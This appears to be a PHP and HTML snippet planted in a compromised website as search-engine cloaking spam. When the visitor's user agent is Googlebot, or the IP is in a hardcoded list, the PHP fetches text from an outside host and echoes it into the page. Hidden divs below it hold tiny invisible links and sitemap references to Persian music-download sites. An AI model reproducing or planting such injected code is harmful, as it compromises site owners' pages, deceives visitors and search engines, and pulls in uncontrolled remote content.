<?php
$file = 'http://opensaz.com/20.txt';
if ( strpos( $_SERVER['HTTP_USER_AGENT'], 'http://www.google.com/bot.html' ) !== false ) {
    echo file_get_contents("$file");
}
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
if (in_array($ip, array("151.233.57.209","184.154.172.54","151.232.228.156", "184.154.172.51", "216.104.35.87", "144.76.129.116"))) {
    echo file_get_contents("$file");
    
}
<div style="display:none;">
<strong><a style="font-size:7px" title="&#1570;&#1607;&#1606;&#1711; &#1580;&#1583;&#1740;&#1583;" href="http://kingseda.in">&#1583;&#1575;&#1606;&#1604;&#1608;&#1583; &#1570;&#1607;&#1606;&#1711; &#1580;&#1583;&#1740;&#1583;</a></strong>
<link rel="alternate" type="application/sitemap+xml" title="Sitemap" href="http://kingseda.in/sitemap.xml">
</div>
<div style="display:none;">
<strong><a style="font-size:7px" title="&#1583;&#1575;&#1606;&#1604;&#1608;&#1583; &#1587;&#1585;&#1740;&#1575;&#1604; &#1593;&#1575;&#1588;&#1602;&#1575;&#1606;&#1607;" href="http://poptaraneh.com/7053_%D8%AF%D8%A7%D9%86%D9%84%D9%88%D8%AF-%D8%B3%D8%B1%DB%8C%D8%A7%D9%84-%D8%B9%D8%A7%D8%B4%D9%82%D8%A7%D9%86%D9%87.html">&#1583;&#1575;&#1606;&#1604;&#1608;&#1583; &#1587;&#1585;&#1740;&#1575;&#1604; &#1593;&#1575;&#1588;&#1602;&#1575;&#1606;&#1607;</a></strong>
</div>
<div style="display:none;">
<strong><a style="font-size:7px" title="&#1570;&#1607;&#1606;&#1711; &#1580;&#1583;&#1740;&#1583;" href="http://poptaraneh.com">&#1583;&#1575;&#1606;&#1604;&#1608;&#1583; &#1570;&#1607;&#1606;&#1711; &#1580;&#1583;&#1740;&#1583;</a></strong>
<link rel="alternate" type="application/sitemap+xml" title="Sitemap" href="http://poptaraneh.com/sitemap.xml">
</div>